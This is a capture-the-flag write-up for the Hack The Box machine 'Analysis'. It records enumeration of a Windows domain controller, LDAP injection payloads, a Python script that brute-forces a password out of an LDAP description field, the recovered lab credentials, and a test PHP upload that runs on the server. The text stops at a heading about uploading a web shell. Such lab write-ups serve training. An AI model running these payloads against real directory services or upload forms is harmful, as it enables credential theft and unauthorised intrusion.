---
title: HTB - Analysis
date: 2024-06-01 02:00:00 + 1000
categories: [CTF,HTB, LDAP injection, DLL hijacking,Active Directory] 
tags: [cve-2016-1417, ldap, htb, RCE,Snort]
comments: false
---

Analysis is Windows Hard-Rated Hack The Box Machine: Exploited using LDAP injection to discover credentials and exploiting a DLL hijacking vulnerability in Snort to gain administrative access.

## Common Enumeration

### Nmap

Running the nmap scan - `nmap -Pn -p- -sC -sV -oA recon/allport 10.10.11.250 --open` found the many open ports
- Indicated that the target is a Windows Domain Controller
- Domain: analysis.htb

```bash
$ nmap -Pn -p- -sC -sV -oA recon/allport 10.10.11.250 --open                                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 18:07 AEST                                                                      
Nmap scan report for 10.10.11.250                                                                                                        
Host is up (0.0087s latency).                                                                                                            
Not shown: 60033 closed tcp ports (conn-refused), 5476 filtered tcp ports (no-response)                                                  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit                                                              
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesnt have a title (text/html)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-31 09:28:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49748/tcp open  msrpc         Microsoft Windows RPC
52382/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=5/31%Time=6659985F%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\
SF:0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(T
SF:LSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11
SF:Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LD
SF:APSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x
SF:20unserializing\x20protobuf\x20message\"\x05HY000")%r(LANDesk-RC,9,"\x0
SF:5\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20m
SF:essage\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRe
SF:quest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\x20message-fr
SF:ame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-31T09:29:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### DNS - 53

Zone transfers appear to be disallowed

```bash
$ dig axfr analysis.htb @10.10.11.250

; <<>> DiG 9.19.21-1-Debian <<>> axfr analysis.htb @10.10.11.250
;; global options: +cmd
; Transfer failed.
```

Reverse lookup did not get any useful information

```bash
$ dig -x 10.10.11.250 @10.10.11.250
;; communications error to 10.10.11.250#53: timed out

; <<>> DiG 9.19.21-1-Debian <<>> -x 10.10.11.250 @10.10.11.250
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 38184
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;250.11.10.10.in-addr.arpa.     IN      PTR

;; Query time: 4589 msec
;; SERVER: 10.10.11.250#53(10.10.11.250) (UDP)
;; WHEN: Fri May 31 18:42:30 AEST 2024
;; MSG SIZE  rcvd: 54
```

### Kerberos - 88

My oversimplified explanation of kerbrute; it brute forces user by analyzing error codes:
- KDC_ERR_PREAUTH_FAILED: Indicates the user exists.
- KDC_ERR_C_PRINCIPAL_UNKNOWN: Indicates the user does not exist.

```bash
$ ./kerbrute userenum --dc 10.10.11.250 -d analysis.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/31/24 - Ronnie Flathers @ropnop

2024/05/31 20:58:01 >  Using KDC(s):
2024/05/31 20:58:01 >   10.10.11.250:88

2024/05/31 20:58:05 >  [+] VALID USERNAME:       jdoe@analysis.htb
2024/05/31 20:58:08 >  [+] VALID USERNAME:       ajohnson@analysis.htb
2024/05/31 20:58:16 >  [+] VALID USERNAME:       cwilliams@analysis.htb
2024/05/31 20:58:20 >  [+] VALID USERNAME:       wsmith@analysis.htb
2024/05/31 20:58:32 >  [+] VALID USERNAME:       jangel@analysis.htb
2024/05/31 20:59:20 >  [+] VALID USERNAME:       technician@analysis.htb
2024/05/31 21:00:10 >  [+] VALID USERNAME:       JDoe@analysis.htb
2024/05/31 21:00:13 >  [+] VALID USERNAME:       AJohnson@analysis.htb
2024/05/31 21:03:42 >  [+] VALID USERNAME:       badam@analysis.htb
```

### SMB - 445

Using [NetExec](https://github.com/Pennyw0rth/NetExec) for SMB enumeration:

- Domain: analysis.htb
- Host: Windows 10 / Server 2019

```bash
$ nxc smb 10.10.11.250
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)

$ nxc smb 10.10.11.250 -u jdoe -p ''
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [-] analysis.htb\jdoe: STATUS_LOGON_FAILURE 
```

Without valid credentials, Not much we can do.

### LDAP - 389
Using `ldapsearch` to query the base naming context:

```bash
$ ldapsearch -x -H ldap://10.10.11.250 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=analysis,DC=htb
namingcontexts: CN=Configuration,DC=analysis,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=analysis,DC=htb
namingcontexts: DC=DomainDnsZones,DC=analysis,DC=htb
namingcontexts: DC=ForestDnsZones,DC=analysis,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Without proper authentication the search did not return useful info

```bash
$ ldapsearch -x -H ldap://10.10.11.250 -s sub -b 'DC=analysis,DC=htb'
# extended LDIF
#
# LDAPv3
# base <DC=analysis,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

## Website - 80

The website is static and doesn't provide useful information. It only mentions that it provides SOC for the client.

![1](/assets/img/Analysis/1.webp)

### Directory / Subdomain Brute forcing

- Gobuster did not find anything useful

```bash
$ gobuster dir -u http://analysis.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://analysis.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 162] [--> http://analysis.htb/images/]
/js                   (Status: 301) [Size: 158] [--> http://analysis.htb/js/]
/css                  (Status: 301) [Size: 159] [--> http://analysis.htb/css/]
/.                    (Status: 200) [Size: 17830]
/bat                  (Status: 301) [Size: 159] [--> http://analysis.htb/bat/]
Progress: 38267 / 38268 (100.00%)
===============================================================
Finished
===============================================================
```

- FFUF found an `internal` subdomain.

```bash
$ ffuf -u http://10.10.11.250 -H "Host: FUZZ.analysis.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac -k

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.250
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.analysis.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 7ms]
:: Progress: [4989/4989] :: Job [1/1] :: 3225 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

- Navigating to `http://internal.analysis.htb/` displayed a 403 Forbidden error.

![2](/assets/img/Analysis/2.webp)

Running another Gobuster scan against `http://internal.analysis.htb/` found three directories:

- /users
- /dashboard
- /employees

```bash
$ gobuster dir -u http://internal.analysis.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -b 404,403===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.analysis.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/users                (Status: 301) [Size: 170] [--> http://internal.analysis.htb/users/]
/dashboard            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/dashboard/]
/employees            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/employees/]
Progress: 38267 / 38268 (100.00%)
===============================================================
Finished
===============================================================
```

At this point, I changed my wordlist to `raft-small-files.txt` since the previous list did not find useful results

- `/users` - found `/list.php`

```bash
$ gobuster dir -u http://internal.analysis.htb/users/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt  -b 404,403
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.analysis.htb/users/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/list.php             (Status: 200) [Size: 17]
Progress: 11424 / 11425 (99.99%)
===============================================================
Finished
===============================================================
```

- `/list.php` displayed `missing parameter`, which is interesting

![3](/assets/img/Analysis/3.webp)

- `/dashboard/` - nothing useful at this stage.

```bash
$ gobuster dir -u http://internal.analysis.htb/dashboard/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt  -b 404,403
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.analysis.htb/dashboard/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/LICENSE.txt          (Status: 200) [Size: 1422]
/index.php            (Status: 200) [Size: 38]
/404.html             (Status: 200) [Size: 13143]
/logout.php           (Status: 302) [Size: 3] [--> ../employees/login.php]
/license.txt          (Status: 200) [Size: 1422]
/upload.php           (Status: 200) [Size: 0]
/form.php             (Status: 200) [Size: 35]
/details.php          (Status: 200) [Size: 35]
/tickets.php          (Status: 200) [Size: 35]
/Index.php            (Status: 200) [Size: 38]
/LICENSE.TXT          (Status: 200) [Size: 1422]
Progress: 11424 / 11425 (99.99%)
===============================================================
Finished
===============================================================
```

- `/employees` - found `/login.php`

```bash
$ gobuster dir -u http://internal.analysis.htb/employees/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt  -b 404,403===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.analysis.htb/employees/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1085]
/Login.php            (Status: 200) [Size: 1085]
/jquery.min.js        (Status: 200) [Size: 85589]
Progress: 11424 / 11425 (99.99%)
===============================================================
Finished
===============================================================
```

- `/login.php` - asked for credentials

![4](/assets/img/Analysis/4.webp)

#### Enumerating /list.php

From the previous findings, navigating to `/list.php` displayed a `missing parameter` message. Using `ffuf` to fuzz the parameter, ffuf discovered the `name` parameter.

```bash
$ ffuf -u "http://internal.analysis.htb/users/list.php/?FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -fs 17

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php/?FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 17
________________________________________________

name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 9ms]
:: Progress: [12334/12334] :: Job [1/1] :: 2439 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Navigating to `http://internal.analysis.htb/users/list.php/?name` brings up a page that appears to query a database and fetch user data.

![5](/assets/img/Analysis/5.webp)

I attempted to query users obtained from the Kerberos enumeration. Only three users returned results.

- jangel
![6](/assets/img/Analysis/6.webp)
- technician
![7](/assets/img/Analysis/7.webp)
- badam
![8](/assets/img/Analysis/8.webp)

It is likely querying from LDAP. After some quick research, I came across [LDAP-Injection-Blind-LDAP-Injection](https://129538173-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-a58ea2462cf2b98a868750b068a00fa32ccb807b%2FEN-Blackhat-Europe-2008-LDAP-Injection-Blind-LDAP-Injection.pdf?alt=media). I used ffuf to fuzz the LDAP attributes.

Note: URL-encoding is needed (use `%26` instead of `&`), as it did not work for me without proper encoding

```bash
$ ffuf -u "http://internal.analysis.htb/users/list.php/?name=technician)(%26(FUZZ=*)" -w /usr/share/wordlists/seclists/Fuzzing/LDAP-active-directory-attributes.txt -fs 406,8           

        /'___\  /'___\           /'___\                                                                                                             
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                             
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                            
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                            
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                             
          \/_/    \/_/   \/___/    \/_/                                                                                                             

       v2.1.0-dev                                                                                                                                   
________________________________________________                                                                                                    

 :: Method           : GET                                                                                                                          
 :: URL              : http://internal.analysis.htb/users/list.php/?name=technician)%28%26%28FUZZ%3D%2A%29                                          
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LDAP-active-directory-attributes.txt                                             
 :: Follow redirects : false                                                                                                                        
 :: Calibration      : false                                                                                                                        
 :: Timeout          : 10                                                                                                                           
 :: Threads          : 40                                                                                                                           
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500                                                                         
 :: Filter           : Response size: 406,8
________________________________________________

accountExpires          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 18ms]
badPasswordTime         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 43ms]
badPwdCount             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 46ms]
cn                      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 43ms]
codePage                [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 62ms]
description             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 19ms]
countryCode             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 67ms]
createTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 66ms]
givenName               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 38ms]
distinguishedName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 93ms]
instanceType            [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 28ms]
lastLogoff              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 34ms]
lastLogon               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 37ms]
logonCount              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 47ms]
modifyTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 120ms]
name                    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 38ms]
objectClass             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 34ms]
nTSecurityDescriptor    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 41ms]
objectCategory          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 39ms]
pwdLastSet              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 39ms]
replPropertyMetaData    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 30ms]
sAMAccountName          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 37ms]
sAMAccountType          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 39ms]
objectGUID              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 188ms]
objectSid               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 188ms]
userAccountControl      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 32ms]
userPrincipalName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 35ms]
:: Progress: [1000/1000] :: Job [1/1] :: 754 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Using `ffuf` to fuzz the LDAP attributes it found many attributes, but the `description` is interesting.

#### LDAP Injection
Using LDAP Injection to brute force the `description` field

```python
import requests

def fuzz_pw(base_url, chars, response_string):
    password = ''
    while True:
        for char in chars:
            if char == '*':
                url = base_url.replace('{FUZZ}', '').replace('{FUZZ_2}', password)
            else:
                url = base_url.replace('{FUZZ}', char).replace('{FUZZ_2}', password)

            if response_string in requests.get(url).text:
                password += char
                print(f"Found char: {char}")
                break
        else:
            break

    return password.rstrip('*')

if __name__ == "__main__":
    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={FUZZ_2}{FUZZ}*)"
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*"
    response_string = "technician"

    output = fuzz_pw(base_url, chars, response_string)
    print(f"\nFound characters: {output}")

```

Password found: `97NTtl*4QP96Bv` from the description field.

```bash
$ python3 pass.py                                                                                                                                 
Found character: 9                                                                                                                                  
Found character: 7                                                                                                                                  
Found character: N                                                                                                                                  
Found character: T                                                                                                                                  
Found character: t                                                                                                                                  
Found character: l                                                                                                                                  
Found character: *                                                                                                                                  
Found character: 4                                                                                                                                  
Found character: Q                                                                                                                                  
Found character: P                                                                                                                                  
Found character: 9                                                                                                                                  
Found character: 6
Found character: B
Found character: v
Found character: *

Found characters: 97NTtl*4QP96Bv
```

#### Validating account

The password was valid, but it did not get any useful information

```bash
$ nxc smb 10.10.11.250 -u technician -p '97NTtl*4QP96Bv'
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv 

$ nxc smb 10.10.11.250 -u technician -p '97NTtl*4QP96Bv' --shares
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv 
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Enumerated shares
SMB         10.10.11.250    445    DC-ANALYSIS      Share           Permissions     Remark
SMB         10.10.11.250    445    DC-ANALYSIS      -----           -----------     ------
SMB         10.10.11.250    445    DC-ANALYSIS      ADMIN$                          Administration à distance
SMB         10.10.11.250    445    DC-ANALYSIS      C$                              Partage par défaut
SMB         10.10.11.250    445    DC-ANALYSIS      IPC$            READ            IPC distant
SMB         10.10.11.250    445    DC-ANALYSIS      NETLOGON        READ            Partage de serveur daccès 
SMB         10.10.11.250    445    DC-ANALYSIS      SYSVOL          READ            Partage de serveur daccès 
```

### Enumerating shares
- `smbclient` to explore `SYSVOL` share
- There is a directory called `analysis.htb`

```bash
$ smbclient //10.10.11.250/SYSVOL -U 'technician%97NTtl*4QP96Bv'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May  8 17:32:36 2023
  ..                                  D        0  Mon May  8 17:32:36 2023
  analysis.htb                       Dr        0  Mon May  8 17:32:36 2023

6494975 blocks of size 4096. 989004 blocks available
```

- Inside analysis.htb:
  - `scripts` directory is empty.

```bash
mb: \> cd analysis.htb\
smb: \analysis.htb\> ls
  .                                   D        0  Mon May  8 17:38:55 2023
  ..                                  D        0  Mon May  8 17:38:55 2023
  DfsrPrivate                      DHSr        0  Mon May  8 17:38:55 2023
  Policies                            D        0  Mon May  8 17:32:42 2023
  scripts                             D        0  Mon May  8 17:32:36 2023

6494975 blocks of size 4096. 989003 blocks available
```

- Directory {31B2F340-016D-11D2-945F-00C04FB984F9}:
  - `USER` - directory is empty.
  - `MACHINE` - directory contains:
    - GPT.INI

```bash
smb: \analysis.htb\> cd Policies\
smb: \analysis.htb\Policies\> ls
  .                                   D        0  Mon May  8 17:32:42 2023
  ..                                  D        0  Mon May  8 17:32:42 2023
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Mon May  8 17:32:41 2023
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Mon May  8 17:32:42 2023

6494975 blocks of size 4096. 988825 blocks available
smb: \analysis.htb\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}\
smb: \analysis.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls
  .                                   D        0  Mon May  8 17:32:41 2023
  ..                                  D        0  Mon May  8 17:32:41 2023
  GPT.INI                             A       23  Tue May 30 21:29:59 2023
  MACHINE                             D        0  Fri May 26 19:09:22 2023
  USER                                D        0  Mon May  8 17:32:41 2023
```

- From `MACHINE` directory, downloaded the `Registry.pol` file.

```bash
smb: \analysis.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> ls
  .                                   D        0  Fri May 26 19:09:22 2023
  ..                                  D        0  Fri May 26 19:09:22 2023
  comment.cmtx                        A      558  Fri May 26 19:09:22 2023
  Microsoft                           D        0  Mon May  8 17:32:41 2023
  Registry.pol                        A     4862  Fri May 26 19:09:22 2023
  Scripts                             D        0  Mon May 22 18:35:57 2023

6494975 blocks of size 4096. 986928 blocks available
```

Used `regpol` to analyze `Registry.pol`, but it did not find any useful information. The other two shares, `NETLOGON` and `IPC$`, did not contain any useful information

## PHP Reverse Shell

From the earlier enumeration, there was `http://internal.analysis.htb/employees/login.php` url. I tried the credentials `technician@analysis.htb:97NTtl*4QP96Bv` and successfully logged in as `technician`.

![9](/assets/img/Analysis/9.webp)

Upon logging in, I found that we can upload files that will be executed.

![10](/assets/img/Analysis/10.webp)

I created a test PHP file to see if I can upload and execute it.

```php
<?php echo 'z3r0da was here'; ?>
```

I successfully uploaded the file and it can be retrieved at http://internal.analysis.htb/dashboard/uploads/hello.php.

![11](/assets/img/Analysis/11.webp)

### Uploading p0wny-shell

